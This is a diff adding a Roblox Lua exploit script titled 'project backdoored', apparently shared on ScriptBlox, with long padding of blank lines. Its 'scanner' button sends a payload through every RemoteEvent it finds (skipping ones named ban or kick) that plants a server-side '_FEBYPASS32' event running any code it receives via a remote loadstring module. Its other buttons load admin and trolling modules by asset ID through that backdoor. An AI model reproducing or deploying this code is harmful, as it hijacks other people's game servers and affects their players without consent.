@@ -1,0 +1,761 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+--v4.0.0
+
+---by gojohdkaisenkt---
+---by gojohdkaisenkt---
+---by gojohdkaisenkt---
+---by gojohdkaisenkt---
+---by gojohdkaisenkt---
+---by gojohdkaisenkt---
+---start---------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-- https://scriptblox.com/script/Universal-Script-new-backdoored-hub-v2-38350
+
+---by gojohdkaisenkt---
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local SS = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local Execute = Instance.new("TextButton")
+local Clear = Instance.new("TextButton")
+local Script = Instance.new("TextBox")
+local Check = Instance.new("TextButton")
+local minosprime = Instance.new("TextButton")
+local minosprime2 = Instance.new("TextButton")
+local minosprime3 = Instance.new("TextButton")
+local minosprime4 = Instance.new("TextButton")
+local ImageLabel = Instance.new("ImageLabel")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local Frame_2 = Instance.new("Frame")
+local Name = Instance.new("TextLabel")
+local idk = Instance.new("TextLabel")
+local UICorner = Instance.new("UICorner")
+local UICorner2 = Instance.new("UICorner")
+local UICorner3 = Instance.new("UICorner")
+local UICorner4 = Instance.new("UICorner")
+local UICorner5 = Instance.new("UICorner")
+local UICorner6 = Instance.new("UICorner")
+local UICorner7 = Instance.new("UICorner")
+local UICorner8 = Instance.new("UICorner")
+local UICorner9 = Instance.new("UICorner")
+local UICorner10 = Instance.new("UICorner")
+local UICorner11 = Instance.new("UICorner")
+local idk2 = Instance.new("ImageLabel")
+
+--Properties:
+SS.Name = "SS"
+SS.Parent = game.CoreGui
+SS.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+SS.ResetOnSpawn = false
+ 
+Main.Name = "Main"
+Main.Parent = SS
+Main.Active = true
+Main.BackgroundColor3 = Color3.new(253,100,50)
+Main.BorderColor3 = Color3.new(255,255,255)
+Main.Position = UDim2.new(0.377503842, 0, 0.37714988, 0)
+Main.Size = UDim2.new(0, 316, 0, 200)
+Main.Draggable = true
+
+Frame_2.Parent = Main
+Frame_2.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
+Frame_2.BorderColor3 = Color3.fromRGB(253,100,50)
+Frame_2.BorderSizePixel = 0
+Frame_2.Position = UDim2.new(-0.26302531, -100, 0, 0)
+Frame_2.Size = UDim2.new(0, 164, 0, 198)
+
+ImageLabel.Parent = Frame_2
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.BorderColor3 = Color3.fromRGB(253, 100, 50)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(-0.26302531, 45, 0, 0)
+ImageLabel.Size = UDim2.new(0, 164, 0, 198)
+ImageLabel.Image = "rbxassetid://123694661930746"
+ImageLabel.ImageTransparency = 0.950
+
+ScrollingFrame.Parent = ImageLabel
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.BackgroundTransparency = 1.000
+ScrollingFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.Size = UDim2.new(0, 164, 0, 198)
+
+UICorner.Parent = Name
+UICorner2.Parent = Script
+UICorner3.Parent = idk
+UICorner4.Parent = Main
+UICorner5.Parent = Clear
+UICorner6.Parent = Execute
+UICorner7.Parent = Check
+UICorner8.Parent = minosprime
+UICorner9.Parent = minosprime2
+UICorner10.Parent = minosprime3
+UICorner11.Parent = minosprime4
+
+Name.Name = "Name"
+Name.Parent = ScrollingFrame
+Name.BackgroundColor3 = Color3.fromRGB(0,0,255)
+Name.Size = UDim2.new(0, 164, 0, 25)
+Name.Font = Enum.Font.GothamBold
+Name.Text = "</>"
+Name.TextColor3 = Color3.fromRGB(0, 0, 0)
+Name.TextScaled = true
+Name.TextSize = 14.000
+Name.TextWrapped = true
+
+ idk.Name = "idk"
+idk.Parent = Main
+idk.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+idk.BorderColor3 = Color3.new(1, 0, 0)
+idk.Size = UDim2.new(0, 316, 0, 24)
+idk.Font = Enum.Font.LuckiestGuy
+idk.Text = "project backdoored v7.2.0"
+idk.Visible = true
+idk.TextColor3 = Color3.new(1, 1, 1)
+idk.TextScaled = true
+idk.TextSize = 14
+idk.TextWrapped = true
+
+Execute.Name = "Execute"
+Execute.Parent = Main
+Execute.BackgroundColor3 = Color3.new(253,100,50)
+Execute.BorderColor3 = Color3.new(253,100,50)
+Execute.Position = UDim2.new(0.0220820196, 0, 0.77142489, 0)
+Execute.Size = UDim2.new(0, 147, 0, 44)
+Execute.AutoButtonColor = false
+Execute.Font = Enum.Font.Code
+Execute.Text = "Execute"
+Execute.TextColor3 = Color3.new(0, 0, 0)
+Execute.TextScaled = true
+Execute.TextSize = 14
+Execute.TextWrapped = true
+ 
+Clear.Name = "Clear"
+Clear.Parent = Main
+Clear.BackgroundColor3 = Color3.new(253,100,50)
+Clear.BorderColor3 = Color3.new(253,100,50)
+Clear.Position = UDim2.new(0.513000011, 0, 0.770999968, 0)
+Clear.Size = UDim2.new(0, 147, 0, 44)
+Clear.Font = Enum.Font.Code
+Clear.Text = "Clear"
+Clear.TextColor3 = Color3.new(0, 0, 0)
+Clear.TextScaled = true
+Clear.TextSize = 14
+Clear.TextWrapped = true
+ 
+Script.Name = "Script"
+Script.Parent = Main
+Script.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+Script.BorderColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+Script.Position = UDim2.new(0, 0, 0.125, 0)
+Script.Size = UDim2.new(0, 316, 0, 124)
+Script.MultiLine = true
+Script.ClearTextOnFocus = false
+Script.Font = Enum.Font.Code
+Script.PlaceholderText = "---put require here"
+Script.Text = "hey "..game.Players.LocalPlayer.Name.." thank for use my script "
+Script.TextColor3 = Color3.new(0, 0, 0)
+Script.TextSize = 25
+Script.TextWrapped = true
+Script.TextXAlignment = Enum.TextXAlignment.Left
+Script.TextYAlignment = Enum.TextYAlignment.Top
+ 
+Check.Name = "Check"
+Check.Parent = Main
+Check.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+Check.BorderColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+Check.Position = UDim2.new(-0.26302531, 400, 0, 0)
+Check.Size = UDim2.new(0, 82, 0, 198)
+Check.Font = Enum.Font.LuckiestGuy
+Check.Text = "scanner"
+Check.Visible = true
+Check.TextColor3 = Color3.new(1, 1, 1)
+Check.TextScaled = true
+Check.TextSize = 14
+Check.TextWrapped = true
+
+idk2.Name = "idk2"
+idk2.Parent = Main
+idk2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+idk2.BackgroundTransparency = 1.000
+idk2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+idk2.BorderSizePixel = 0
+idk2.Size = UDim2.new(0, 40, 0, 40)
+idk2.Image = "http://www.roblox.com/asset/?id=81257050771519"
+
+minosprime.Name = "minosprime"
+minosprime.Parent = ScrollingFrame
+minosprime.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+minosprime.BorderColor3 = Color3.new(1, 0, 0)
+minosprime.Position = UDim2.new(0.0224948879, 0, 0.0681124506, 0)
+minosprime.Size = UDim2.new(0, 164, 0, 25)
+minosprime.Font = Enum.Font.LuckiestGuy
+minosprime.Text = "Polaria hub"
+minosprime.TextColor3 = Color3.new(1, 1, 1)
+minosprime.TextScaled = true
+minosprime.TextSize = 14
+minosprime.TextWrapped = true
+
+minosprime2.Name = "minosprime2"
+minosprime2.Parent = ScrollingFrame
+minosprime2.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+minosprime2.BorderColor3 = Color3.new(1, 0, 0)
+minosprime2.Position = UDim2.new(0.0224948879, 0, 0.184964776, 0)
+minosprime2.Size = UDim2.new(0, 164, 0, 25)
+minosprime2.Font = Enum.Font.LuckiestGuy
+minosprime2.Text = "HD admin"
+minosprime2.TextColor3 = Color3.new(1, 1, 1)
+minosprime2.TextScaled = true
+minosprime2.TextSize = 14
+minosprime2.TextWrapped = true
+
+minosprime3.Name = "minosprime3"
+minosprime3.Parent = ScrollingFrame
+minosprime3.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+minosprime3.BorderColor3 = Color3.new(1, 0, 0)
+minosprime3.Position = UDim2.new(0.0224948879, 0, 0.343302786, 0)
+minosprime3.Size = UDim2.new(0, 164, 0, 25)
+minosprime3.Font = Enum.Font.LuckiestGuy
+minosprime3.Text = "anti skids v14.1.1"
+minosprime3.TextColor3 = Color3.new(1, 1, 1)
+minosprime3.TextScaled = true
+minosprime3.TextSize = 14
+minosprime3.TextWrapped = true
+
+minosprime4.Name = "minosprime4"
+minosprime4.Parent = ScrollingFrame
+minosprime4.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+minosprime4.BorderColor3 = Color3.new(1, 0, 0)
+minosprime4.Position = UDim2.new(0.0224948879, 0, 0.443302786, 0)
+minosprime4.Size = UDim2.new(0, 164, 0, 25)
+minosprime4.Font = Enum.Font.LuckiestGuy
+minosprime4.Text = "koop gui"
+minosprime4.TextColor3 = Color3.new(1, 1, 1)
+minosprime4.TextScaled = true
+minosprime4.TextSize = 14
+minosprime4.TextWrapped = true
+
+-- Scripts:
+function execute(s)
+	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+		local Execute=game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(tostring(s)) -- execute
+	else
+		warn("Failed to loadstring: Error 404")
+	end
+end
+Execute.MouseButton1Click:connect(function()
+    game.ReplicatedStorage.RemoteEvent:FireServer(Script.Text)
+end)
+ 
+Clear.MouseButton1Click:connect(function()
+    Script.Text = "clear Success"
+wait(0.5)
+    Script.Text = ""
+end)
+ 
+Check.MouseButton1Click:connect(function()
+Check.Text = "scanning."
+wait(0.01)
+Check.Text = "scanning.."
+wait(0.01)
+Check.Text = "scanning..."
+wait(0.01)
+Check.Text = "not found🔴:("
+wait (0.0000001)
+ local function b_G_V12(see)
+		local a = function(ree)
+			ree:FireServer([[
+                    local folder = Instance.new('RemoteEvent')
+                    folder.Name = "_FEBYPASS32"
+                    folder.Parent = game:GetService("JointsService")
+                    local loadstring = require(13684410229)
+                    folder.OnServerEvent:Connect(function(_1,_2)
+                       loadstring(_2)()
+                    end)
+                    ]]
+			)
+		end
+		for i, v in pairs(see:GetChildren()) do
+			--[[3 lines]]
+			if v:IsA("RemoteEvent") then
+				if not string.match(string.lower(v.Name), "ban") then
+					if not string.match(string.lower(v.Name), "kick") then
+						a(v)
+					end
+				end
+			end
+			--[[-3 lines]]
+			b_G_V12(v) --[[test]]
+		end
+	end
+	local Inject = b_G_V12(game:GetService("ReplicatedStorage"))
+	local timetoken = 0
+	local maxtime = 5
+	repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
+	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+		Check.Text = "found ✔️🔵:)"
+      wait()
+game:GetService("StarterGui"):SetCore("SendNotification",{  Title = "we found a backdoored",      
+
+ 
+
+Text = "we found backdoored in 0.5s",
+Icon = "rbxassetid://123694661930746"; --icon
+		Duration = "5"; -- how long its on screen
+ 
+
+})
+
+game:GetService("StarterGui"):SetCore("SendNotification",{  
+
+ 
+
+Title = "credit",      
+
+ 
+
+Text = "project backdoored create by gojohdkaisenkt",
+Icon = "rbxassetid://123694661930746"; --icon
+		Duration = "5"; -- how long its on screen
+ 
+
+})
+game:GetService("StarterGui"):SetCore("SendNotification",{  
+
+ 
+
+Title = "project backdoored version",      
+
+ 
+
+Text = "now verison is 7.2.0",
+
+Icon = "rbxassetid://123694661930746"; --icon
+		Duration = "5"; -- how long its on screen
+ 
+
+})
+
+			end
+		end)
+minosprime.MouseButton1Click:Connect(function()
+	execute("require(123255432303221):Pload('"..game.Players.LocalPlayer.Name.."')")
+end) 
+minosprime2.MouseButton1Click:Connect(function()
+	execute("require(7192763922).load('"..game.Players.LocalPlayer.Name.."')")
+end)
+minosprime3.MouseButton1Click:Connect(function()
+	execute("require(10304477576).AntiSkid('"..game.Players.LocalPlayer.Name.."')")
+end)
+minosprime4.MouseButton1Click:Connect(function()
+	execute("require(14829670677).EDITL0L('"..game.Players.LocalPlayer.Name.."')")
+end)
+local LigmaProject = Instance.new("ScreenGui")
+local ImageLabel = Instance.new("ImageLabel")
+local fr6 = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+
+LigmaProject.Name = "LigmaProject"
+LigmaProject.Parent = game.CoreGui
+
+ImageLabel.Parent = LigmaProject
+ImageLabel.Active = true
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.Position = UDim2.new(-0.127000004, 0, 0.407999992, 0)
+ImageLabel.Size = UDim2.new(0, 90, 0, 90)
+ImageLabel.Image = "rbxassetid://81257050771519"
+
+fr6.Name = "fr6"
+fr6.Parent = ImageLabel
+fr6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+fr6.BackgroundTransparency = 1.000
+fr6.Position = UDim2.new(0, 0, -0.633333325, 0)
+fr6.Size = UDim2.new(0, 90, 0, 50)
+fr6.Font = Enum.Font.SourceSansBold
+fr6.Text = "R15 -> R6"
+fr6.TextColor3 = Color3.fromRGB(0, 0, 0)
+fr6.TextScaled = true
+fr6.TextSize = 18.000
+fr6.TextTransparency = 1.000
+fr6.TextWrapped = true
+
+TextLabel_2.Parent = ImageLabel
+TextLabel_2.Active = true
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.99999994, 0, 0, 0)
+TextLabel_2.Size = UDim2.new(0, 269, 0, 90)
+TextLabel_2.Font = Enum.Font.SourceSansBold
+TextLabel_2.LineHeight = 1.100
+TextLabel_2.Text = "Project backdoored by gojohdkaisenkt and Unverified Run scripts on game backdoored"                                                                       
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 15.000
+TextLabel_2.TextTransparency = 1.000
+TextLabel_2.TextWrapped = true
+
+local function UpdateVisibilityBasedOnRigType()
+    local TweenService = game:GetService("TweenService")
+    local txt = ImageLabel.TextLabel
+    local btn = fr6
+    wait(1)
+    ImageLabel:TweenPosition(UDim2.new(0.458, 0, 0.408, 0), "Out", "Linear", 0.4, false)
+    wait(3)
+    ImageLabel:TweenPosition(UDim2.new(0.01, 0, 0.813, 0), "Out", "Sine", 0.7, false)
+    wait(1)
+    TweenService:Create(txt, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["BackgroundTransparency"] = 0}):Play()
+    TweenService:Create(txt, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["TextTransparency"] = 0}):Play()
+
+    for i, v in pairs(game.Players:GetPlayers()) do
+        if v.Character and v.Character:FindFirstChild("Humanoid") then
+            if v.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                btn.Visible = false
+            elseif v.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                TweenService:Create(btn, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["BackgroundTransparency"] = 0}):Play()
+                TweenService:Create(btn, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["TextTransparency"] = 0}):Play()
+                btn.Visible = true
+            end
+        end
+    end
+
+    wait(2)
+
+    while wait() do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            if v.Character and v.Character:FindFirstChild("Humanoid") then
+                if v.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                    btn.Visible = false
+                elseif v.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                    btn.Visible = true
+                end
+            end
+        end
+    end
+end
+
+fr6.MouseButton1Click:Connect(function()
+    local player = game.Players.LocalPlayer
+    if player and player.Character and player.Character:FindFirstChild("Humanoid") then
+        if player.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+            fr6.Visible = false
+            execute("require(123255432303221):Pload('"..game.Players.LocalPlayer.Name.."')")
+        end
+    end
+end)
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(character)
+        local btn = fr6
+        btn.Visible = true
+    end)
+end)
+
+UpdateVisibilityBasedOnRigType()
